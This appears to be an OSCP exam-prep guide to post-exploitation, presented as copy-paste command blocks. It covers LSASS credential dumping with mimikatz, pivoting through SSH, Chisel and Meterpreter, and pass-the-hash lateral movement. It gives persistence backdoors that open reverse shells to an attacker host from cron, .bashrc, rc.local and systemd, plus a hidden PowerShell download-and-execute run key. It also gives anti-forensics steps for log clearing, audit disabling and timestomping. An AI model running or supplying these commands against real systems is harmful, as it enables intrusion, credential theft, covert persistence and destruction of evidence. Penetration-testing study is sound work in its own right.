# OSCP Post-Exploitation & Pivoting Master Guide

## Table of Contents
- [Initial Post-Exploitation](#initial-post-exploitation)
- [Information Gathering](#information-gathering)
- [Credential Harvesting](#credential-harvesting)
- [Network Pivoting](#network-pivoting)
- [Lateral Movement](#lateral-movement)
- [Persistence Techniques](#persistence-techniques)
- [Anti-Forensics](#anti-forensics)
- [Common Scenarios](#common-scenarios)

## Initial Post-Exploitation

### First Steps After Getting Shell (Copy-Paste Ready)

#### Windows Initial Commands
```cmd
# Basic system information
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ver

# Network information
ipconfig /all
route print
arp -A
netstat -ano

# Users and groups
net users
net localgroup administrators
net user %USERNAME%

# Quick privilege check
whoami /priv | findstr /i "SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege SeBackupPrivilege"
```

#### Linux Initial Commands
```bash
# Basic system information
whoami
id
hostname
uname -a
cat /etc/os-release

# Network information
ip a
ip route
netstat -tulpn
ss -tulpn

# Users and permissions
cat /etc/passwd
groups
sudo -l

# Quick SUID check
find / -type f -perm -4000 2>/dev/null | head -20
```

### Upgrading Shells

#### Linux Shell Upgrades
```bash
# Python TTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Full interactive shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice
export SHELL=bash
export TERM=xterm-256color

# Alternative methods
script -qc /bin/bash /dev/null
echo os.system('/bin/bash')
/bin/sh -i
exec 5<>/dev/tcp/attacker-ip/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
```

#### Windows Shell Upgrades
```cmd
# PowerShell from cmd
powershell.exe -nop -ep bypass

# WinRM if credentials available
winrs -r:target -u:user -p:pass cmd

# PSExec style upgrade
psexec.exe -i -s cmd.exe
```

## Information Gathering

### Windows Information Gathering

#### System Information
```cmd
# Detailed system info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic computersystem get Name,Domain,Manufacturer,Model,NumberOfProcessors,TotalPhysicalMemory

# Installed software
wmic product get name,version
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# Running processes
tasklist /svc
wmic process list full

# Scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo csv /v | findstr /v "INFO"

# Services
sc query state= all
wmic service list brief
```

#### Network Information
```cmd
# Network configuration
ipconfig /all
route print
arp -a

# Network shares
net share
net view \\localhost
net view /domain

# Network connections
netstat -ano
netstat -an | findstr LISTEN
```

#### User and Group Information
```cmd
# Current user details
net user %USERNAME%
net user %USERNAME% /domain

# All users
net users
net users /domain

# Local groups
net localgroup
net localgroup administrators
net localgroup "Remote Desktop Users"

# Domain groups
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

### Linux Information Gathering

#### System Information
```bash
# System details
uname -a
cat /etc/os-release
cat /etc/issue
lsb_release -a

# Hardware info
cat /proc/cpuinfo
cat /proc/meminfo
lscpu
free -m

# Installed packages
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RedHat/CentOS
yum list installed         # CentOS/RHEL
pacman -Q                  # Arch

# Running processes
ps aux
ps -ef
pstree -p
```

#### Network Information
```bash
# Network configuration
ip a
ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network-scripts/ifcfg-*

# Routing information
ip route
route -n
cat /proc/net/route

# Network connections
netstat -tulpn
ss -tulpn
lsof -i

# ARP table
arp -a
cat /proc/net/arp
```

#### User and Group Information
```bash
# User information
id
whoami
groups
cat /etc/passwd
getent passwd

# Group information
cat /etc/group
getent group

# Sudo permissions
sudo -l

# Login history
last
w
who

# User directories
ls -la /home/
ls -la /root/
```

## Credential Harvesting

### Windows Credential Harvesting

#### Registry Credential Locations
```cmd
# AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Stored credentials
cmdkey /list
dir C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\
dir C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# PuTTY sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

# SNMP parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile <SSID> key=clear
```

#### File-Based Credential Hunting
```cmd
# Search for password files
findstr /si password *.txt *.xml *.config *.ini
findstr /si pass *.txt *.xml *.config *.ini
dir /s *pass* == *cred* == *vnc* == *.config*

# Common locations
type "C:\sysprep.inf"
type "C:\sysprep\sysprep.xml"  
type "C:\unattend.xml"
type "C:\Windows\Panther\Unattend.xml"
type "C:\Windows\Panther\Unattend\Unattend.xml"

# IIS web.config files
dir /s web.config
findstr /si connectionstring web.config

# Database files
dir /s *.db *.mdb *.sqlite
```

#### Memory Credential Extraction
```cmd
# LSASS dump (requires admin)
tasklist | findstr lsass
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Use offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# Direct memory access (if admin)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Linux Credential Harvesting

#### Configuration Files
```bash
# Common config files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# History files
cat ~/.bash_history
cat ~/.mysql_history  
cat ~/.python_history
find /home -name ".*history" -exec ls -la {} \; 2>/dev/null

# Configuration files
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
cat /etc/bash.bashrc
```

#### Database and Application Files
```bash
# Database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
find / -name "*.sql" 2>/dev/null

# Web application files
find /var/www -name "config*" -o -name "*.conf" -o -name "*.config" 2>/dev/null
grep -r "password\|pass\|pwd" /var/www/ 2>/dev/null

# Application config directories
ls -la /opt/
ls -la /etc/
find /etc -name "*config*" -o -name "*.conf" 2>/dev/null
```

#### Memory and Process Analysis
```bash
# Process memory
ps aux
gdb -p <pid>
(gdb) generate-core-file
(gdb) quit
strings core.<pid> | grep -i pass

# System dumps
find / -name "core" 2>/dev/null
strings /proc/kcore | grep -i pass 2>/dev/null
```

## Network Pivoting

### Discovery of Additional Networks

#### Windows Network Discovery
```cmd
# Network interfaces
ipconfig /all
wmic nicconfig get description,IPAddress,MACAddress

# Routing table
route print
netstat -rn

# ARP table (discover live hosts)
arp -a

# Network shares
net view
net view /domain

# Ping sweep (if ICMP allowed)
for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up

# Port scanning with PowerShell
powershell.exe -c "1..254 | ForEach-Object {$ip='192.168.1.' + $_; if (Test-NetConnection $ip -Port 445 -WarningAction SilentlyContinue -InformationLevel Quiet) {echo \"$ip : 445 open\"}}"
```

#### Linux Network Discovery  
```bash
# Network interfaces
ip a
ifconfig -a
cat /proc/net/dev

# Routing table
ip route
route -n
cat /proc/net/route

# ARP table
arp -a
cat /proc/net/arp

# Network scan using bash
for i in {1..254}; do
    (ping -c 1 192.168.1.$i | grep "64 bytes" &) 2>/dev/null
done

# Port scanning with netcat
for port in 22 23 80 443 445; do
    nc -zv 192.168.1.1 $port 2>&1 | grep succeeded
done
```

### SSH Tunneling and Port Forwarding

#### SSH Local Port Forwarding
```bash
# Forward local port to remote service
ssh -L <local-port>:<target-ip>:<target-port> user@pivot-host

# Example: Access internal web server
ssh -L 8080:10.1.1.10:80 user@pivot-host
# Access via http://localhost:8080

# Multiple ports
ssh -L 8080:10.1.1.10:80 -L 3389:10.1.1.10:3389 user@pivot-host
```

#### SSH Dynamic Port Forwarding (SOCKS Proxy)
```bash
# Create SOCKS proxy
ssh -D 1080 user@pivot-host

# Configure proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf

# Use proxychains with tools
proxychains nmap -sT -Pn 10.1.1.0/24
proxychains crackmapexec smb 10.1.1.0/24
```

#### SSH Reverse Port Forwarding
```bash
# On pivot machine: Forward its port back to attacker
ssh -R <attacker-port>:<target-ip>:<target-port> attacker@attacker-ip

# Example: Make internal service accessible on attacker
ssh -R 8080:10.1.1.10:80 attacker@attacker-ip
```

### Metasploit Pivoting

#### Meterpreter Pivoting
```bash
# Get meterpreter session on pivot host
# Add route to internal network
meterpreter > run autoroute -s 10.1.1.0/24

# Background session and use auxiliary modules
background
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.1.1.0/24
set THREADS 10
run

# SOCKS proxy through meterpreter
use auxiliary/server/socks4a
set SRVPORT 1080
run -j

# Use external tools through proxy
proxychains nmap -sT 10.1.1.10
```

#### Portfwd in Meterpreter
```bash
# Forward ports through meterpreter
meterpreter > portfwd add -l 8080 -p 80 -r 10.1.1.10
meterpreter > portfwd list
meterpreter > portfwd delete -l 8080

# Access forwarded service
curl http://localhost:8080
```

### Chisel Pivoting

#### Chisel Setup
```bash
# On attacker machine
./chisel server -p 8000 --reverse

# On pivot machine (Linux)
./chisel client attacker-ip:8000 R:1080:socks

# On pivot machine (Windows)
chisel.exe client attacker-ip:8000 R:1080:socks

# Use SOCKS proxy
proxychains nmap -sT 10.1.1.0/24
```

#### Chisel Port Forwarding
```bash
# Forward specific port
./chisel client attacker-ip:8000 R:8080:10.1.1.10:80

# Multiple forwards
./chisel client attacker-ip:8000 R:8080:10.1.1.10:80 R:3389:10.1.1.10:3389
```

### Windows Native Pivoting

#### Netsh Port Forwarding
```cmd
# Enable IP forwarding
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.1.1.10 connectport=80

# List forwards
netsh interface portproxy show v4tov4

# Delete forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080
```

#### PowerShell Reverse Proxy
```powershell
# Simple PowerShell port forward
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 8080)
$listener.Start()
while ($true) {
    $client = $listener.AcceptTcpClient()
    $target = [System.Net.Sockets.TcpClient]::new('10.1.1.10', 80)
    # ... proxy traffic between client and target
}
```

## Lateral Movement

### Windows Lateral Movement

#### Pass-the-Hash with Impacket
```bash
# PSExec with hash
impacket-psexec domain/username@target -hashes lm-hash:nt-hash

# WMIExec with hash
impacket-wmiexec domain/username@target -hashes lm-hash:nt-hash

# SMBExec with hash
impacket-smbexec domain/username@target -hashes lm-hash:nt-hash

# AtExec with hash (scheduled task)
impacket-atexec domain/username@target -hashes lm-hash:nt-hash 'whoami'
```

#### CrackMapExec Lateral Movement
```bash
# Password spray across network
crackmapexec smb 10.1.1.0/24 -u username -p password

# Pass-the-hash across network
crackmapexec smb 10.1.1.0/24 -u username -H nt-hash

# Execute commands
crackmapexec smb 10.1.1.10 -u username -p password -x 'whoami'

# WinRM lateral movement
crackmapexec winrm 10.1.1.10 -u username -p password
```

#### WinRM Lateral Movement
```bash
# Evil-WinRM
evil-winrm -i 10.1.1.10 -u username -p password
evil-winrm -i 10.1.1.10 -u username -H nt-hash

# PowerShell Remoting
powershell.exe -c "Enter-PSSession -ComputerName 10.1.1.10 -Credential (Get-Credential)"
```

### Linux Lateral Movement

#### SSH-Based Movement
```bash
# SSH with password
ssh username@10.1.1.10

# SSH with key
ssh -i private_key username@10.1.1.10

# SSH with agent forwarding
ssh -A username@10.1.1.10

# SSH through jump host
ssh -J user@pivot-host user@target-host
```

#### Credential Reuse
```bash
# Test found credentials across network
for ip in 10.1.1.{10..20}; do
    echo "Testing $ip"
    sshpass -p 'password' ssh -o ConnectTimeout=3 user@$ip 'whoami' 2>/dev/null
done

# SU/sudo with found passwords
su - otheruser
sudo -u otheruser /bin/bash
```

## Persistence Techniques

### Windows Persistence

#### Registry Run Keys
```cmd
# Current user run key
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"

# Local machine run key (requires admin)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"

# Run once keys
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v backdoor /t REG_SZ /d "C:\backdoor.exe"
```

#### Scheduled Tasks
```cmd
# Create scheduled task
schtasks /create /sc onstart /tn "WindowsUpdate" /tr "C:\backdoor.exe" /ru system /f

# User logon trigger
schtasks /create /sc onlogon /tn "UserTask" /tr "C:\backdoor.exe" /ru %USERNAME% /f

# Time-based trigger
schtasks /create /sc daily /st 09:00 /tn "DailyTask" /tr "C:\backdoor.exe" /ru system /f

# List tasks
schtasks /query /fo list /v
```

#### Service Creation
```cmd
# Create service
sc create "WindowsUpdate" binpath="C:\backdoor.exe" start=auto
sc description "WindowsUpdate" "Critical Windows Update Service"

# Start service
sc start "WindowsUpdate"

# Service with dependencies
sc create "BackdoorService" binpath="C:\backdoor.exe" start=auto depend="Tcpip/Dhcp"
```

#### WMI Event Subscriptions
```cmd
# PowerShell WMI persistence
powershell.exe -c "Register-WmiEvent -Query 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2' -Action { Start-Process 'C:\backdoor.exe' }"

# WMI permanent event consumer (advanced)
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="BotFilter47", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
```

### Linux Persistence

#### Cron Jobs
```bash
# User crontab
crontab -e
# Add: */5 * * * * /bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1

# System cron directories
echo "*/5 * * * * root /bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1" >> /etc/crontab
echo "#!/bin/bash" > /etc/cron.hourly/backdoor
echo "/bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1" >> /etc/cron.hourly/backdoor
chmod +x /etc/cron.hourly/backdoor
```

#### SSH Keys
```bash
# Add SSH key for persistence
mkdir -p ~/.ssh
echo 'ssh-rsa AAAAB3...' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Root SSH key
mkdir -p /root/.ssh  
echo 'ssh-rsa AAAAB3...' >> /root/.ssh/authorized_keys
```

#### Startup Scripts
```bash
# ~/.bashrc modification
echo "/bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1 &" >> ~/.bashrc

# /etc/rc.local (system startup)
echo "/bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1 &" >> /etc/rc.local

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

## Anti-Forensics

### Log Clearing

#### Windows Log Clearing
```cmd
# Clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Clear specific logs
for /f "tokens=*" %1 in ('wevtutil el') do wevtutil cl "%1"

# Disable logging (requires admin)
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
```

#### Linux Log Clearing
```bash
# Clear common logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/messages
cat /dev/null > ~/.bash_history

# Clear last login records
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp

# Clear history and logout
history -c && exit
```

### Timestomping
```cmd
# Windows - change file timestamps
powershell.exe -c "(Get-Item 'C:\backdoor.exe').LastWriteTime = '1/1/2000 12:00:00 AM'"
powershell.exe -c "(Get-Item 'C:\backdoor.exe').CreationTime = '1/1/2000 12:00:00 AM'"

# Linux - change file timestamps  
touch -r /etc/passwd backdoor.sh
touch -t 200001010000 backdoor.sh
```

## Common Scenarios

### Scenario 1: DMZ to Internal Network
```
1. Compromise DMZ server via web vulnerability
2. Enumerate internal networks from DMZ
3. Set up pivot through DMZ server
4. Scan internal network through pivot
5. Lateral movement to internal servers
6. Escalate privileges on internal network
```

### Scenario 2: Multi-Hop Pivoting
```
1. Initial compromise: External web server
2. Pivot 1: DMZ database server
3. Pivot 2: Internal file server  
4. Target: Domain controller on management network
5. Chain pivots together for deep network access
```

### Scenario 3: Active Directory Environment
```
1. Initial access to workstation
2. Local privilege escalation to SYSTEM
3. Dump credentials from LSASS
4. Lateral movement using dumped credentials
5. Kerberoasting for service account passwords
6. Compromise service account with high privileges
7. DCSync attack for complete domain compromise
```

## Quick Reference Commands

### Network Discovery One-Liners
```bash
# Windows network sweep
for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i

# Linux network sweep
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes" & done; wait

# Port scan through SSH tunnel
ssh -D 1080 user@pivot && proxychains nmap -sT 10.1.1.0/24
```

### Credential Hunting One-Liners
```cmd
REM Windows credential hunt
findstr /si password *.txt *.xml *.config *.ini & reg query HKLM /f password /t REG_SZ /s
```

```bash
# Linux credential hunt
grep -r "password\|pass\|pwd" /etc/ /var/ /opt/ 2>/dev/null | grep -v Binary
```

### Persistence One-Liners
```cmd
REM Windows registry persistence
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v backdoor /d "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```

```bash
# Linux cron persistence
echo "*/10 * * * * /bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1" | crontab -
```

Remember: Post-exploitation is about maintaining access, gathering intelligence, and moving deeper into the network. Always document your pivots and access paths for the exam report!